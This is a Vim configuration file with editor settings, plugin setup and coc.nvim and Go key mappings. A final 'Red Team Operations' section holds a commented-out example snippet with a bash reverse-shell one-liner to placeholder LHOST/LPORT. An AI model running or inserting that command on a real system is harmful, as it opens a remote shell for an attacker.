" =============================================================================
" Basic Settings
" =============================================================================
syntax enable
set nocompatible            " Be iMproved, required for some plugins
filetype plugin indent on   " Enable filetype detection and indentation

" General UI
set ignorecase              " Ignore case when searching
set smartcase               " Don't ignore case if search pattern contains uppercase
set nowrap                  " Don't wrap lines
set number                  " Show line numbers
set relativenumber          " Show relative line numbers
set ruler                   " Show row and column in status line
set showcmd                 " Show incomplete commands
set smartindent             " Smart auto-indenting
set shiftwidth=2            " Number of spaces to use for autoindent
set tabstop=2               " Number of spaces that a tab in the file uses
set expandtab               " Use spaces instead of tabs
set backspace=indent,eol,start " Make backspace work like most other editors
set hidden                  " Allow buffers to be hidden
set noerrorbells            " Don't beep
set visualbell              " Use visual bell instead of audible bell
set wildmenu                " Enhanced command-line completion
set scrolloff=8             " Keep 8 lines above/below cursor when scrolling
set cmdheight=2             " Give more space for messages
set updatetime=300          " Faster update for plugins like coc.nvim

" Search
set hlsearch                " Highlight search results
set incsearch               " Incremental search

" Persistent Undo
set undofile                " Save undo history
set undodir=~/.vim/undodir  " Directory to save undo files

" Leader Key
let mapleader = ","         " Set leader key to comma
let maplocalleader = "\\"   " Set localleader key to backslash

" =============================================================================
" Plugin Management (vim-plug)
" =============================================================================
call plug#begin('~/.vim/plugged')

" Theme
Plug 'dracula/vim', { 'as': 'dracula' }

" General Utilities
Plug 'tpope/vim-fugitive'
Plug 'tpope/vim-surround'
Plug 'tpope/vim-commentary'
Plug 'scrooloose/nerdtree'
Plug 'Xuyuanp/nerdtree-git-plugin'
Plug 'jistr/vim-nerdtree-tabs'
Plug 'vim-airline/vim-airline'
Plug 'vim-airline/vim-airline-themes'

" Language Support
Plug 'fatih/vim-go', { 'do': ':GoUpdateBinaries' }
Plug 'neoclide/coc.nvim', {'branch': 'release'}

call plug#end()

" =============================================================================
" Theme Configuration
" =============================================================================
colorscheme dracula
set background=dark

" =============================================================================
" Plugin Specific Settings
" =============================================================================

" NERDTree
map <C-n> :NERDTreeToggle<CR>
let g:NERDTreeDirArrowExpandable = '▸'
let g:NERDTreeDirArrowCollapsible = '▾'

" vim-airline
let g:airline_theme='dracula'
let g:airline_powerline_fonts = 1

" COC.nvim
" TextEdit might fail if hidden is not set.
set hidden
" Some servers (e.g. gopls) require this to be set.
set nobackup
set nowritebackup
" Always show the signcolumn, otherwise it would shift the text each time
" diagnostics appear.
set signcolumn=yes
" Use tab for trigger completion with characters ahead and navigate.
" Use command ':verbose imap <tab>' to see where tab is mapped.
inoremap <silent><expr> <TAB>
      \ pumvisible() ? "\<C-n>" :
      \ <SID>check_back_space() ? "\<TAB>" :
      \ coc#refresh()
inoremap <expr><S-TAB> pumvisible() ? "\<C-p>" : "\<C-h>"

function! s:check_back_space() abort
  let col = col('.') - 1
  return !col || getline('.')[col - 1] =~ '\s'
endfunction

" Use <c-space> to trigger completion.
inoremap <silent><expr> <c-space> coc#refresh()

" Use `gd` for goto definition (and `gy` for type definition, `gi` for implementation)
nmap <silent> gd <Plug>(coc-definition)
nmap <silent> gy <Plug>(coc-type-definition)
nmap <silent> gi <Plug>(coc-implementation)
nmap <silent> gr <Plug>(coc-references)

" Use K for show documentation in preview window
nnoremap <silent> K :call <SID>show_documentation()<CR>

function! s:show_documentation()
  if (index(['vim','help'], &filetype) >= 0)
    execute 'h '.expand('<cword>')
  else
    call CocAction('doHover')
  endif
endfunction

" Highlight the symbol and its references when holding the cursor.
autocmd CursorHold * silent call CocActionAsync('highlight')

" Apply TextEdit to current buffer.
nmap <leader>rn <Plug>(coc-rename)

" Formatting selected code
xmap <leader>f  <Plug>(coc-format-selected)
nmap <leader>f  <Plug>(coc-format-selected)

" Go specific settings
au FileType go nmap <leader>r <Plug>(go-run)
au FileType go nmap <leader>b <Plug>(go-build)
au FileType go nmap <leader>t <Plug>(go-test)
au FileType go nmap <leader>c <Plug>(go-coverage-toggle)
au FileType go nmap <Leader>e <Plug>(go-rename)
au FileType go nmap <Leader>s <Plug>(go-implements)
au FileType go nmap <Leader>i <Plug>(go-info)
let g:go_doc_popup_window = 1

" =============================================================================
" Red Team Operations
" =============================================================================

" -- Syntax Highlighting --
" Enable syntax highlighting for common red team file types
" Using filetype on should handle most of these, but explicit settings are fine.
au BufRead,BufNewFile *.ps1 set filetype=ps1
au BufRead,BufNewFile *.py set filetype=python
au BufRead,BufNewFile *.pl set filetype=perl
au BufRead,BufNewFile *.rb set filetype=ruby
au BufRead,BufNewFile *.php set filetype=php

" -- Snippets --
" To use snippets, you need a snippet engine like ultisnips or neosnippet.
" Once you have a snippet engine installed, you can add snippets like this:
" snippet revshell "Reverse Shell"
"   bash -i >& /dev/tcp/LHOST/LPORT 0>&1
" endsnippet